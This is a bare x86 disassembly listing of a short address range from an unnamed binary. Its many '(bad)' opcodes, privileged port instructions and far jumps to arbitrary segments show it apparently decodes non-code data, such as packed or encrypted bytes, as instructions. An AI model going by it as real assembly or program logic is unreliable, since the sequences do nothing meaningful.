  41cca6:	mov    edx,0x8026b69a
  41ccab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccac:	std    
  41ccad:	xor    DWORD PTR [esi-0x3932687f],esi
  41ccb3:	clc    
  41ccb4:	hlt    
  41ccb5:	and    eax,0x5abc86b2
  41ccba:	xor    DWORD PTR [ebp+0x31bb41ed],0xffffffea
  41ccc1:	pop    ebp
  41ccc2:	fs retf 
  41ccc4:	sbb    DWORD PTR [esi],eax
  41ccc6:	and    edi,ecx
  41ccc8:	in     eax,0x1d
  41ccca:	(bad)  
  41cccb:	mov    dl,0xe5
  41cccd:	lea    esi,[edx+esi*8+0x5d]
  41ccd1:	sbb    DWORD PTR [ecx+edi*1+0x46],0x28
  41ccd6:	fist   DWORD PTR [edx+0x32]
  41ccd9:	iret   
  41ccda:	ja     0x41cd25
  41ccdc:	ins    DWORD PTR es:[edi],dx
  41ccdd:	lods   al,BYTE PTR ds:[esi]
  41ccde:	mov    eax,0x41f481bd
  41cce3:	sub    ecx,esi
  41cce5:	pop    edi
  41cce6:	and    ch,BYTE PTR [edi+ebx*1+0x3d]
  41ccea:	scas   eax,DWORD PTR es:[edi]
  41cceb:	inc    esi
  41ccec:	mov    edi,0x754e6df1
  41ccf1:	pop    edi
  41ccf2:	sub    cl,dl
  41ccf4:	leave  
  41ccf5:	add    DWORD PTR [edx-0xdc548ea],esi
  41ccfb:	cdq    
  41ccfc:	lea    esi,[edi-0x20]
  41ccff:	int    0xe1
  41cd01:	outs   dx,DWORD PTR ds:[esi]
  41cd02:	(bad)  
  41cd03:	mov    bl,0xec
  41cd05:	fisttp WORD PTR [esi-0x320347e8]
  41cd0b:	push   ss
  41cd0c:	and    esi,0x32d23a73
  41cd12:	pop    edx
  41cd13:	pop    edx
  41cd14:	in     eax,dx
  41cd15:	xchg   ebx,eax
  41cd16:	leave  
  41cd17:	and    DWORD PTR [ecx],edx
  41cd19:	out    0x62,eax
  41cd1b:	popa   
  41cd1c:	jmp    0x4ba8:0x1cec3f6b
  41cd23:	aad    0x7b
  41cd25:	test   eax,0x26bf2d40
  41cd2a:	cmp    al,0x14
  41cd2c:	jns    0x41ccc8
  41cd2e:	sbb    al,0xa4
  41cd30:	loopne 0x41ccbe
  41cd32:	scas   al,BYTE PTR es:[edi]
  41cd33:	call   0x45029050
  41cd38:	mov    edx,0x108321ff
  41cd3d:	jbe    0x41cd73
  41cd3f:	pop    esp
  41cd40:	btr    edi,esp
  41cd43:	ret    
  41cd44:	arpl   WORD PTR [ebp-0x344d2a07],di
  41cd4a:	popf   
  41cd4b:	mov    dh,0x55
  41cd4d:	jb     0x41cd6f
  41cd4f:	dec    eax
  41cd50:	leave  
  41cd51:	outs   dx,BYTE PTR ds:[esi]
  41cd52:	cmc    
  41cd53:	nop
  41cd54:	cmp    DWORD PTR [ecx-0x6a09e8b3],edx
  41cd5a:	js     0x41cd4e
  41cd5c:	push   0xffffffe8
  41cd5e:	popa   
  41cd5f:	xchg   ebp,eax
  41cd60:	js     0x41cd80
  41cd62:	xor    DWORD PTR [ecx-0x2c3fa2d2],ecx
  41cd68:	jnp    0x41cdd0
  41cd6a:	mov    eax,ds:0xb9346519
  41cd6f:	xor    DWORD PTR [ebx+0x5c],ebp
  41cd72:	and    ch,ah
  41cd74:	mov    al,BYTE PTR [ebx-0x52]
  41cd77:	or     esi,ecx
  41cd79:	and    eax,0xeae12aa2
  41cd7e:	inc    eax
  41cd7f:	mov    cs,WORD PTR [edx-0x67310093]
  41cd85:	adc    DWORD PTR [eax-0x20],0xcc38f96c
  41cd8c:	in     eax,dx
  41cd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd8e:	cmp    eax,0x36ac907e
  41cd93:	jmp    0xafd701e5
  41cd98:	xchg   esp,eax
  41cd99:	loop   0x41cd1c
  41cd9b:	imul   ebp,DWORD PTR [edi+0x436bff58],0x2eda6263
  41cda5:	or     DWORD PTR [ebx],edx
  41cda7:	mov    ah,0x59
  41cda9:	out    0x50,al
  41cdab:	xor    cl,bl
  41cdad:	ja     0x41ce2a
  41cdaf:	mov    al,ds:0xe024bd17
  41cdb4:	retf   
  41cdb5:	dec    ebx
  41cdb6:	dec    ecx
  41cdb7:	jge    0x41ce25
  41cdb9:	aad    0xa4
  41cdbb:	loop   0x41ce05
  41cdbd:	aas    
  41cdbe:	jnp    0x41cd8d
  41cdc0:	push   ecx
  41cdc1:	mov    bl,0x93
  41cdc3:	(bad)  
  41cdc4:	xchg   edx,eax
  41cdc5:	fsubr  DWORD PTR [ebx+ecx*2-0x67]
  41cdc9:	(bad)  
  41cdca:	push   ebx
  41cdcb:	sbb    al,BYTE PTR [ecx-0x70]
  41cdce:	or     al,0x4f
  41cdd0:	test   al,0x3e
  41cdd2:	leave  
  41cdd3:	arpl   WORD PTR [edi+0x3fb494a3],sp
  41cdd9:	push   eax
  41cdda:	lahf   
  41cddb:	mov    cs,esp
  41cddd:	and    al,0xeb
  41cddf:	adc    eax,0xed7c7a4d
  41cde4:	fsubr  st(7),st
  41cde6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cde7:	xor    BYTE PTR [esi-0x2],bl
  41cdea:	es xchg ecx,eax
  41cdec:	xor    ecx,DWORD PTR [ebp-0xd7adfa0]
  41cdf2:	add    BYTE PTR [ecx-0x650458d8],dl
  41cdf8:	fscale 
  41cdfa:	inc    eax
  41cdfb:	dec    esp
  41cdfc:	lahf   
  41cdfd:	mov    ebx,0x5949924c
  41ce02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce03:	gs jno 0x41cdc0
  41ce06:	dec    esi
  41ce07:	stos   DWORD PTR es:[edi],eax
  41ce08:	sbb    DWORD PTR [esi],0x5ff300d9
  41ce0e:	pop    edi
  41ce0f:	push   edi
  41ce10:	leave  
  41ce11:	xor    esi,DWORD PTR [esi+0x5cc364df]
  41ce17:	lds    esi,FWORD PTR [ebx+0x5310956]
  41ce1d:	pop    eax
  41ce1e:	push   ebp
  41ce1f:	(bad)  
  41ce20:	(bad)  
  41ce21:	push   cs
  41ce22:	cmp    ecx,esi
  41ce24:	arpl   WORD PTR [ebx+0x6],di
  41ce27:	daa    
  41ce28:	ret    0xb220
  41ce2b:	call   0x132e:0xccbb8a46
  41ce32:	not    DWORD PTR es:[esi+eiz*1-0x54571e87]
  41ce3a:	mov    ds:0x27693296,al
  41ce3f:	clc    
  41ce40:	lea    edx,[eax-0x45e3e129]
  41ce46:	fucomp st(2)
  41ce48:	hlt    
  41ce49:	imul   ebx,edx,0x1242d98b
  41ce4f:	inc    ecx
  41ce50:	jno    0x41ce46
  41ce52:	je     0x41cecb
  41ce54:	test   eax,0x171661e
  41ce59:	popa   
  41ce5a:	fist   DWORD PTR [ebx+edx*8-0x2ee093a2]
  41ce61:	and    al,0xc2
  41ce63:	loop   0x41ce18
  41ce65:	lods   al,BYTE PTR ds:[esi]
  41ce66:	mov    ebp,0x86704bd
  41ce6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6c:	push   edx
  41ce6d:	imul   sp,WORD PTR [edi+0x19],0xff98
  41ce72:	(bad)  
  41ce73:	loop   0x41ce34
  41ce75:	cmp    eax,0x451fea89
  41ce7a:	jecxz  0x41cef6
  41ce7c:	xchg   ebp,eax
  41ce7d:	or     dl,cl
  41ce7f:	rcr    DWORD PTR ds:0x748f8604,1
  41ce85:	fistp  WORD PTR [esi+0x4cb943f2]
  41ce8b:	mov    ecx,0x1c105419
  41ce90:	adc    al,0x7d
  41ce92:	lods   eax,DWORD PTR ds:[esi]
  41ce93:	add    BYTE PTR [ecx],ch
  41ce95:	scas   eax,DWORD PTR es:[edi]
  41ce96:	dec    ecx
  41ce97:	mov    ecx,DWORD PTR [ebp-0x75]
  41ce9a:	and    sp,di
  41ce9d:	daa    
  41ce9e:	jno    0x41cec5
  41cea0:	mov    ebx,0x7720e5d0
  41cea5:	sbb    esi,eax
  41cea7:	inc    edi
  41cea8:	mov    dl,0x8c
  41ceaa:	dec    esp
  41ceab:	rcr    BYTE PTR [ebx+0x28fa320a],1
  41ceb1:	outs   dx,BYTE PTR ds:[esi]
  41ceb2:	(bad)  
  41ceb3:	jmp    0x3002e80c
  41ceb8:	xchg   ebx,eax
  41ceb9:	jns    0x41ce6e
  41cebb:	vpsadbw ymm0,ymm0,YMMWORD PTR [ebp+0x6e2ae8c1]
  41cec3:	mov    fs,WORD PTR [edx+0x68]
  41cec6:	push   0x37e67aa3
  41cecb:	rcr    DWORD PTR [edi+0x44],1
  41cece:	add    eax,0xb497273c
  41ced3:	cld    
  41ced4:	js     0x41cf2d
  41ced6:	aad    0xdf
  41ced8:	push   esp
  41ced9:	cmp    eax,0xb63bd3d7
  41cede:	pop    esi
  41cedf:	xchg   ecx,eax
  41cee0:	sbb    DWORD PTR ds:0x3041a954,esp
  41cee6:	test   BYTE PTR [ebx+ebp*4-0x28],dh
  41ceea:	imul   eax,DWORD PTR [ebp+0x6],0x426a18b3
  41cef1:	xchg   edx,eax
  41cef2:	(bad)  
  41cef3:	(bad)  
  41cef4:	sbb    DWORD PTR [esi-0x39041261],edx
  41cefa:	dec    esp
  41cefb:	repnz popf 
  41cefd:	mov    ah,0x9d
  41ceff:	clc    
  41cf00:	mov    eax,ds:0x649f0715
  41cf05:	push   ebx
  41cf06:	lea    esi,[edx-0x9]
  41cf09:	imul   edx,esp,0x7d
  41cf0c:	cmp    al,0x3a
  41cf0e:	add    ah,bl
  41cf10:	mov    ss,esi
  41cf12:	xchg   edi,eax
  41cf13:	add    bh,al
  41cf15:	frstor [ebx-0x14]
  41cf18:	push   ebx
  41cf19:	adc    al,0xa5
  41cf1b:	mov    ds:0x558a81b6,eax
  41cf20:	cmp    al,0xb0
  41cf22:	sub    eax,DWORD PTR [edx-0x16]
  41cf25:	sbb    DWORD PTR [edi],esi
  41cf27:	xlat   BYTE PTR ds:[ebx]
  41cf28:	or     BYTE PTR [edx+0x7a],dh
  41cf2b:	lea    ebx,[ecx]
  41cf2d:	adc    BYTE PTR ds:0xb83bd41,cl
  41cf33:	jl     0x41cf52
  41cf35:	imul   esi,DWORD PTR [esi+0x7c68a5be],0x417f01c8
  41cf3f:	dec    ecx
  41cf40:	xlat   BYTE PTR ds:[ebx]
  41cf41:	js     0x41cf39
  41cf43:	js     0x41cf25
  41cf45:	shr    DWORD PTR [eax+0x4e],cl
  41cf48:	mov    dl,0x80
  41cf4a:	aad    0xff
  41cf4c:	mov    WORD PTR [edx],fs
  41cf4e:	adc    al,0x6c
  41cf50:	xor    dl,dl
  41cf52:	les    edx,FWORD PTR [edi-0x315bae6]
  41cf58:	(bad)  
  41cf59:	ficom  WORD PTR [edx+ebx*8+0xe97e2c6]
  41cf60:	xor    eax,0x15d9e998
  41cf65:	es aam 0xcc
  41cf68:	imul   esi,DWORD PTR [edx],0x3a6b43cf
  41cf6e:	jne    0x41cf67
  41cf70:	fist   WORD PTR [ebp+0x31658a1d]
  41cf76:	adc    DWORD PTR [esi+0x434bd35e],esi
  41cf7c:	mov    al,0x8f
  41cf7e:	(bad)  
  41cf7f:	and    BYTE PTR ds:0x59649d8a,dl
  41cf85:	leave  
  41cf86:	aad    0xdd
  41cf88:	mul    edi
  41cf8a:	push   esi
  41cf8b:	scas   al,BYTE PTR es:[edi]
  41cf8c:	sahf   
  41cf8d:	jne    0x41cf6d
  41cf8f:	or     DWORD PTR [eax-0x13],0x21
  41cf93:	dec    ecx
  41cf94:	mov    dl,0x8e
  41cf96:	xor    cl,ch
  41cf98:	int    0x27
  41cf9a:	mov    ch,0x3d
  41cf9c:	and    eax,0x8e1d41e4
  41cfa1:	icebp  
  41cfa2:	push   esi
  41cfa3:	das    
  41cfa4:	mov    esp,0xea19def9
  41cfa9:	adc    ebp,DWORD PTR [edx-0x261df259]
  41cfaf:	inc    eax
  41cfb0:	sub    ebx,DWORD PTR [edi+0x61]
  41cfb3:	retf   
  41cfb4:	aam    0x9f
  41cfb6:	xchg   al,ch
  41cfb8:	aad    0xa1
  41cfba:	dec    ebx
  41cfbb:	scas   al,BYTE PTR es:[edi]
  41cfbc:	xchg   BYTE PTR [eax-0x59],bl
  41cfbf:	mov    edi,0x61afb6ab
  41cfc4:	sub    ch,bl
  41cfc6:	xchg   ebx,eax
  41cfc7:	in     eax,dx
  41cfc8:	mov    al,0x66
  41cfca:	in     eax,0xf5
  41cfcc:	adc    BYTE PTR [ecx-0x15a2bfd1],0x1f
  41cfd3:	adc    BYTE PTR [esi+0x985713d],ah
  41cfd9:	out    dx,al
  41cfda:	add    dh,BYTE PTR [ecx+0x6d]
  41cfdd:	mov    ebp,0x36ce365
  41cfe2:	arpl   WORD PTR [ebx-0x1ea7e3d],di
  41cfe8:	js     0x41d037
  41cfea:	push   edx
  41cfeb:	add    al,0x3
  41cfed:	stos   DWORD PTR es:[edi],eax
  41cfee:	inc    ecx
  41cfef:	fadd   st,st(3)
  41cff1:	repnz push ss
  41cff3:	mov    edi,0xfc7674c7
  41cff8:	jecxz  0x41d01e
  41cffa:	sti    
  41cffb:	sahf   
  41cffc:	and    al,0xb4
  41cffe:	or     al,0x7d
  41d000:	xor    ah,BYTE PTR [ebx+0x5e]
  41d003:	or     BYTE PTR ds:0xbc1d5f4c,cl
  41d009:	fimul  WORD PTR [ebx+0x70]
  41d00c:	push   cs
  41d00d:	jae    0x41d017
  41d00f:	shr    ebp,1
  41d011:	dec    esi
  41d012:	mov    ebp,0x5891c152
  41d017:	das    
  41d018:	out    0xa2,eax
  41d01a:	and    edx,DWORD PTR [esi]
  41d01c:	popa   
  41d01d:	push   eax
  41d01e:	aad    0x1f
  41d020:	hlt    
  41d021:	push   0xe
  41d023:	mov    cs,esi
  41d025:	jne    0x41d00d
  41d027:	xor    bl,BYTE PTR [ecx-0xa]
  41d02a:	push   edi
  41d02b:	pop    esi
  41d02c:	imul   ecx,DWORD PTR [ebx-0x566b3767],0xffffffd5
  41d033:	outs   dx,BYTE PTR ds:[esi]
  41d034:	stos   BYTE PTR es:[edi],al
  41d035:	es (bad) 
  41d037:	xlat   BYTE PTR ds:[ebx]
  41d038:	arpl   WORD PTR [edi+esi*4],sp
  41d03b:	xchg   esi,eax
  41d03c:	jbe    0x41cfee
  41d03e:	inc    edi
  41d03f:	ins    BYTE PTR es:[edi],dx
  41d040:	and    DWORD PTR [ecx+0x2b],esp
  41d043:	js     0x41cfca
  41d045:	into   
  41d046:	push   edx
  41d047:	push   esp
  41d048:	ficomp WORD PTR [edi]
  41d04a:	pop    esi
  41d04b:	test   ebp,ebp
  41d04d:	push   esp
  41d04e:	cmp    dh,cl
  41d050:	mov    ds:0xfe046eab,al
  41d055:	(bad)  
  41d056:	in     al,dx
  41d057:	inc    ebx
  41d058:	add    DWORD PTR [esi-0x4e],ebp
  41d05b:	lods   al,BYTE PTR ds:[esi]
  41d05c:	stc    
  41d05d:	fidivr WORD PTR [ecx]
  41d05f:	sub    BYTE PTR [ecx-0x7f4cff6d],ah
  41d065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d067:	jmp    0x5d018958
  41d06c:	mov    eax,0x77866d04
  41d071:	pop    edx
  41d072:	and    BYTE PTR [ebx],bl
  41d074:	dec    esi
  41d075:	mov    bl,0x45
  41d077:	jmp    0xa49e2887
  41d07c:	ret    
  41d07d:	mov    ch,0xeb
  41d07f:	xor    al,0xdd
  41d081:	clc    
  41d082:	daa    
  41d083:	idiv   al
  41d085:	jne    0x41d0de
  41d087:	sub    edx,esi
  41d089:	test   BYTE PTR [ecx],bl
  41d08b:	sbb    al,0x14
  41d08d:	les    ecx,FWORD PTR [edx-0x1eaea586]
  41d093:	dec    esi
  41d094:	and    eax,0x51d62c73
  41d099:	addr16 jae 0x41d0db
  41d09c:	mov    bh,BYTE PTR [ebx+0x3c]
  41d09f:	rcr    DWORD PTR [ebx-0x22b0c307],1
  41d0a5:	cmp    al,bl
  41d0a7:	mov    dl,bh
  41d0a9:	mov    ss,WORD PTR [ebp-0x7cdb5512]
  41d0af:	inc    eax
  41d0b0:	aad    0x1a
  41d0b2:	arpl   WORD PTR [ecx],si
  41d0b4:	dec    ebp
  41d0b5:	add    al,0x3a
  41d0b7:	xor    eax,0xc48a8a8
  41d0bc:	pop    ds
  41d0bd:	cdq    
  41d0be:	mov    ecx,0x2f9d794e
  41d0c3:	xchg   ebp,eax
  41d0c4:	retf   
  41d0c5:	push   ecx
  41d0c6:	aaa    
  41d0c7:	cdq    
  41d0c8:	or     ebx,DWORD PTR [edi]
  41d0ca:	inc    edx
  41d0cb:	and    eax,0x16d2bb36
  41d0d0:	fwait
  41d0d1:	push   eax
  41d0d2:	jecxz  0x41d0ac
  41d0d4:	cmp    BYTE PTR ds:0x48e30920,ch
  41d0da:	ret    
  41d0db:	pop    edi
  41d0dc:	call   0x810ad9f0
  41d0e1:	push   eax
  41d0e2:	cmp    DWORD PTR [ebp+0x313e9a8],ebp
  41d0e8:	push   esi
  41d0e9:	nop
  41d0ea:	neg    BYTE PTR [eax-0x7d]
  41d0ed:	mov    ecx,0xdcca01f9
  41d0f2:	icebp  
  41d0f3:	or     BYTE PTR [edi-0x7e],ah
  41d0f6:	push   ebp
  41d0f7:	icebp  
  41d0f8:	stos   DWORD PTR es:[edi],eax
  41d0f9:	stos   DWORD PTR es:[edi],eax
  41d0fa:	mov    esp,0x15e6f1ff
  41d0ff:	aaa    
  41d100:	dec    ebx
  41d101:	xchg   edi,eax
  41d102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d103:	mov    ch,0xf8
  41d105:	sbb    dh,BYTE PTR [edi-0x1e]
  41d108:	setle  BYTE PTR [edx]
  41d10b:	xor    al,0x3f
  41d10d:	ror    DWORD PTR [esi+0x4a4b1b78],cl
  41d113:	sbb    dl,dl
  41d115:	cmp    eax,0xace57bf3
  41d11a:	ret    0x7788
  41d11d:	push   0x96e5f92c
  41d122:	jmp    0x47cb:0x87ef0bed
  41d129:	and    al,0x28
  41d12b:	dec    esp
  41d12c:	jnp    0x41d0bb
  41d12e:	neg    BYTE PTR [ebx]
  41d130:	pop    ds
  41d131:	lds    eax,FWORD PTR [ebx]
  41d133:	adc    eax,0x4c4bd27f
  41d138:	lock call 0xfe4adcb3
  41d13e:	xchg   ebx,eax
  41d13f:	or     esi,esi
  41d141:	in     al,0x33
  41d143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d144:	push   es
  41d145:	inc    esi
  41d146:	inc    ebp
  41d147:	fld    QWORD PTR [eax]
  41d149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d14a:	scas   eax,DWORD PTR es:[edi]
  41d14b:	js     0x41d0d5
  41d14d:	pop    esi
  41d14e:	stc    
  41d14f:	mov    DWORD PTR [ecx+0x472fd1b4],esi
  41d155:	out    0xe4,al
  41d157:	or     ebx,DWORD PTR [ebp+0x212c547d]
  41d15d:	cmp    DWORD PTR [ecx],esi
  41d15f:	sub    cl,BYTE PTR [eax]
  41d161:	xor    BYTE PTR [ebx+0x35],ah
  41d164:	lods   al,BYTE PTR ds:[esi]
  41d165:	enter  0x3b80,0x70
  41d169:	fwait
  41d16a:	xor    BYTE PTR [edx+0x49],bl
  41d16d:	jmp    0x76af:0x7c96319d
  41d174:	(bad)  
  41d175:	aam    0x67
  41d177:	lfs    ebx,FWORD PTR [esp+eax*1-0x7b42d9c4]
  41d17f:	mov    ebp,0xddb799f1
  41d185:	pop    ds
  41d186:	scas   al,BYTE PTR es:[edi]
  41d187:	retf   
  41d188:	out    0xcd,eax
  41d18a:	push   ss
  41d18b:	lods   al,BYTE PTR ds:[esi]
  41d18c:	cmp    eax,DWORD PTR [edi]
  41d18e:	mov    ah,0xe8
  41d190:	fcmovbe st,st(0)
  41d192:	adc    eax,DWORD PTR [esi+0x65b5bc35]
  41d198:	mov    ds:0x418d4ed7,eax
  41d19d:	sar    BYTE PTR [edx-0x58],cl
  41d1a0:	ficom  DWORD PTR [edi+0x53]
  41d1a3:	pop    ss
  41d1a4:	push   0xa40ce52
  41d1a9:	(bad)  
  41d1aa:	nop
  41d1ab:	mov    al,ds:0xed6c3ae
  41d1b0:	jae    0x41d1da
  41d1b2:	inc    esp
  41d1b3:	jle    0x41d1e7
  41d1b5:	add    DWORD PTR [eax-0x43],ebx
  41d1b8:	jbe    0x41d1d8
  41d1ba:	jecxz  0x41d21c
  41d1bc:	jle    0x41d204
  41d1be:	and    esp,DWORD PTR [ebx+0x34d6e536]
  41d1c4:	fstp   TBYTE PTR [ebx+ebp*4+0x3e308c19]
  41d1cb:	push   ss
  41d1cc:	outs   dx,BYTE PTR ds:[esi]
  41d1cd:	and    al,0xe9
  41d1cf:	cli    
  41d1d0:	mul    BYTE PTR [edi-0x55918145]
  41d1d6:	ror    DWORD PTR [esi-0x2a],1
  41d1d9:	push   esp
  41d1da:	mov    ebp,0x1d3f35bd
  41d1df:	sbb    BYTE PTR [ecx+0x7219571a],ch
  41d1e5:	and    ebx,DWORD PTR [ecx]
  41d1e7:	cmc    
  41d1e8:	(bad)  
  41d1e9:	stos   DWORD PTR es:[edi],eax
  41d1ea:	mov    esp,0x11fc760
  41d1ef:	int3   
  41d1f0:	and    eax,0xe0198f0f
  41d1f5:	jno    0x41d198
  41d1f7:	(bad)  
  41d1f8:	lock nop
  41d1fa:	jbe    0x41d1e7
  41d1fc:	call   0x291ccc52
  41d201:	lods   eax,DWORD PTR ds:[esi]
  41d202:	mov    DWORD PTR [ecx-0x79],eax
  41d205:	imul   esp,esi,0x78384c25
  41d20b:	fcmovb st,st(6)
  41d20d:	xchg   ecx,eax
  41d20e:	fidiv  DWORD PTR [ebx-0x75564bfb]
  41d214:	push   edi
  41d215:	popf   
  41d216:	bound  edi,QWORD PTR [ecx-0xb7b38cb]
  41d21c:	ja     0x41d212
  41d21e:	or     DWORD PTR ds:0x355b7d9,0x56500c0d
  41d228:	and    BYTE PTR [esi-0x55],ch
  41d22b:	ja     0x41d1b9
  41d22d:	sbb    DWORD PTR [ebx],edi
  41d22f:	xchg   edx,eax
  41d230:	xchg   edi,esp
  41d232:	loope  0x41d25f
  41d234:	jae    0x41d21a
  41d236:	in     al,0xa0
  41d238:	iret   
  41d239:	mov    ds,esp
  41d23b:	enter  0x348b,0xf7
  41d23f:	call   0x4d93:0x57a8244c
  41d246:	xor    edi,esp
  41d248:	stos   DWORD PTR es:[edi],eax
  41d249:	and    cl,bl
  41d24b:	repz pop es
  41d24d:	cld    
  41d24e:	sti    
  41d24f:	dec    esi
  41d250:	ins    BYTE PTR es:[edi],dx
  41d251:	loope  0x41d218
  41d253:	adc    edi,DWORD PTR [edi+ecx*1+0x1e04dff0]
  41d25a:	pushf  
  41d25b:	dec    esp
  41d25c:	ins    DWORD PTR es:[edi],dx
  41d25d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d25e:	out    dx,eax
  41d25f:	sub    eax,0xbb0f44fd
  41d264:	stos   DWORD PTR es:[edi],eax
  41d265:	out    0x69,eax
  41d267:	fmul   QWORD PTR [esi+0x3c3c38ed]
  41d26d:	pop    esp
  41d26e:	popf   
  41d26f:	sbb    BYTE PTR ds:0xf2e98dd8,dl
  41d275:	add    DWORD PTR [esi+0x2c75e4f8],edx
  41d27b:	(bad)  
  41d27c:	mov    ah,0x76
  41d27e:	mov    edx,0x1468cd3d
  41d283:	jns    0x41d2dd
  41d285:	pop    ds
  41d286:	out    dx,eax
  41d287:	mov    gs,WORD PTR [edi-0x5f]
  41d28a:	xchg   DWORD PTR [edx],ebp
  41d28c:	sub    BYTE PTR [esi+ecx*1+0x2a97665a],bh
  41d293:	test   eax,0xac686cce
  41d298:	hlt    
  41d299:	xchg   DWORD PTR [esi+edi*2-0x5a],edi
  41d29d:	jl     0x41d2a2
  41d29f:	outs   dx,DWORD PTR ds:[esi]
  41d2a0:	pop    esi
  41d2a1:	jo     0x41d306
  41d2a3:	ja     0x41d2a0
  41d2a5:	push   esi
  41d2a6:	xchg   DWORD PTR [edi+0x15dcc72c],esp
  41d2ac:	retf   
  41d2ad:	adc    BYTE PTR [edx-0x17e5dcb3],al
  41d2b3:	js     0x41d2ec
  41d2b5:	shr    BYTE PTR [ebp+0x26],0x44
  41d2b9:	xchg   edi,eax
  41d2ba:	jb     0x41d317
  41d2bc:	jae    0x41d270
  41d2be:	mov    cl,0xdb
  41d2c0:	out    0x9f,al
  41d2c2:	xor    ch,dl
  41d2c4:	daa    
  41d2c5:	aad    0x31
  41d2c7:	jle    0x41d280
  41d2c9:	sbb    DWORD PTR [esp+eiz*8-0x4c34fa02],eax
  41d2d0:	sbb    eax,esi
  41d2d2:	shl    DWORD PTR [edi],cl
  41d2d4:	push   edi
  41d2d5:	dec    ebp
  41d2d6:	jne    0x41d2ad
  41d2d8:	(bad)  
  41d2d9:	dec    edi
  41d2da:	xchg   ebp,eax
  41d2db:	out    0x4d,eax
  41d2dd:	loopne 0x41d26a
  41d2df:	popf   
  41d2e0:	dec    edx
  41d2e1:	xchg   ebp,eax
  41d2e2:	jmp    0x41d2d2
  41d2e4:	sbb    eax,0x9834424d
  41d2e9:	mov    ah,0x12
  41d2eb:	xor    ah,bl
  41d2ed:	mov    ds:0x48049322,al
  41d2f2:	pop    ss
  41d2f3:	adc    BYTE PTR ds:0x895bbb66,ah
  41d2f9:	inc    ebx
  41d2fa:	mov    dl,BYTE PTR [ebx]
  41d2fc:	shl    BYTE PTR [ecx-0x68],1
  41d2ff:	or     eax,ecx
  41d301:	out    0x3c,al
  41d303:	jnp    0x41d2e8
  41d305:	fbld   TBYTE PTR [esi+0x263ccba6]
  41d30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d30c:	mov    cl,0x5f
  41d30e:	cwde   
  41d30f:	leave  
  41d310:	sub    DWORD PTR [edx+0x16],ebp
  41d313:	jbe    0x41d2f6
  41d315:	xlat   BYTE PTR ds:[ebx]
  41d316:	pop    es
  41d317:	mov    DWORD PTR [ebx+ebp*4+0x17],edx
  41d31b:	aam    0x81
  41d31d:	adc    eax,0x6e4dcdb0
  41d322:	daa    
  41d323:	dec    edx
  41d324:	adc    BYTE PTR [esi],cl
  41d326:	push   eax
  41d327:	mov    eax,ds:0x882cc721
  41d32c:	or     al,0xcf
  41d32e:	into   
  41d32f:	lds    edi,FWORD PTR [esi-0xd]
  41d332:	pushf  
  41d333:	jns    0x41d3b1
  41d335:	sub    ebx,eax
  41d337:	pushf  
  41d338:	pop    esi
  41d339:	arpl   WORD PTR [bx+si],dx
  41d33c:	addr16 idiv esp
  41d33f:	and    al,0xd
  41d341:	adc    ecx,ecx
  41d343:	and    dl,BYTE PTR [eax]
  41d345:	or     eax,ecx
  41d347:	(bad)  
  41d348:	pusha  
  41d349:	cmp    al,0x2d
  41d34b:	add    bl,dl
  41d34d:	push   ss
  41d34e:	mov    edx,0xf3766967
  41d353:	in     eax,0xe7
  41d355:	mov    esp,0x8cc98f3a
  41d35a:	dec    edi
  41d35b:	inc    edi
  41d35c:	mov    edx,0x3463c774
  41d361:	pop    edx
  41d362:	cmp    BYTE PTR [edi+esi*8-0x2e14a511],0x2
  41d36a:	not    DWORD PTR [ecx-0x1b]
  41d36d:	nop
  41d36e:	mov    ecx,0xac97a5fa
  41d373:	jmp    0x62f:0x3101683b
  41d37a:	fsubp  st(6),st
  41d37c:	sbb    al,0xe8
  41d37e:	lock imul esp,DWORD PTR [edx],0x5cbe1b43
  41d385:	mov    esi,0xc2f0bbd
  41d38a:	(bad)  
  41d38b:	test   DWORD PTR [edx-0x29],0x1339cfb9
  41d392:	sbb    DWORD PTR [ecx+0x744b01ab],esi
  41d398:	cmp    eax,DWORD PTR [edi-0x46]
  41d39b:	outs   dx,DWORD PTR ds:[esi]
  41d39c:	jl     0x41d342
  41d39e:	pop    esi
  41d39f:	les    esp,FWORD PTR [ebx-0x22]
  41d3a2:	(bad)  
  41d3a4:	push   ds
  41d3a5:	push   ebp
  41d3a6:	jmp    0x41d401
  41d3a8:	jmp    0xa8f7bf62
  41d3ad:	call   0x7dee6030
  41d3b2:	aad    0xf2
  41d3b4:	lods   eax,DWORD PTR ds:[esi]
  41d3b5:	loop   0x41d359
  41d3b7:	cmp    al,0x44
  41d3b9:	sbb    bl,BYTE PTR [edx+eiz*4+0x69a530a4]
  41d3c0:	lock ss jns 0x41d39b
  41d3c4:	cmp    esp,DWORD PTR [esi+0x1a1c7f38]
  41d3ca:	pop    ecx
  41d3cb:	retf   
  41d3cc:	dec    edx
  41d3cd:	cs sub al,0x2b
  41d3d0:	add    DWORD PTR [ebx-0x12],ebp
  41d3d3:	sar    BYTE PTR [edi],cl
  41d3d5:	mov    BYTE PTR [ecx+0x31],al
  41d3d8:	stos   BYTE PTR es:[edi],al
  41d3d9:	dec    ebp
  41d3da:	mov    esp,0xa781e1cd
  41d3df:	sub    DWORD PTR [ebx],edi
  41d3e1:	je     0x41d36a
  41d3e3:	jae    0x41d415
  41d3e5:	loop   0x41d44c
  41d3e7:	jbe    0x41d3a3
  41d3e9:	jne    0x41d3a5
  41d3eb:	mov    BYTE PTR [edx],al
  41d3ed:	mov    ebp,0x87c13d5d
  41d3f2:	mov    ebp,0x7e7f0ce8
  41d3f7:	mov    esp,0x76338b98
  41d3fc:	jns    0x41d42c
  41d3fe:	jae    0x41d403
  41d400:	jp     0x41d46c
  41d402:	mov    esi,0x8ed8af40
  41d407:	(bad)  
  41d408:	mov    bl,BYTE PTR [edx]
  41d40a:	or     ch,BYTE PTR [ebp-0x74]
  41d40d:	xchg   ecx,eax
  41d40e:	jmp    0x41d45a
  41d410:	outs   dx,BYTE PTR ds:[esi]
